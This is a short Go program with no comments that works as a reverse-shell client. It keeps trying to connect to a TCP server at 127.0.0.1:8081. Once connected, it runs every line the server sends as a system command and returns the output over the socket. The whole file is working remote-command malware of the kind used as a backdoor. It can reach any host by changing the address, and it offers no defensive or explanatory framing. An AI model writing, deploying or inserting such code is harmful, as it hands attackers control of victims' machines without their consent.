package main

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
	"strings"
	"time"
)

func receiveFromServer(conn net.Conn) {
	for {
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err == io.EOF {
			log.Fatal(err)
		}

		command := strings.Fields(message)

		fmt.Println(command)

		var cmd *exec.Cmd

		if len(command) == 1 {
			cmd = exec.Command(command[0])
		} else if len(command) > 1 {
			cmd = exec.Command(command[0], command[1:]...)
		} else {
			continue
		}

		cmd.Stdout = conn
		cmd.Stderr = conn

		cmd.Run()
	}
}

func main() {
	var conn net.Conn
	var err error

	for {
		conn, err = net.Dial("tcp", "127.0.0.1:8081")
		if err == nil {
			break
		}
		fmt.Println("cant connect to srv")
		time.Sleep(time.Second * 1)
	}

	receiveFromServer(conn)
}
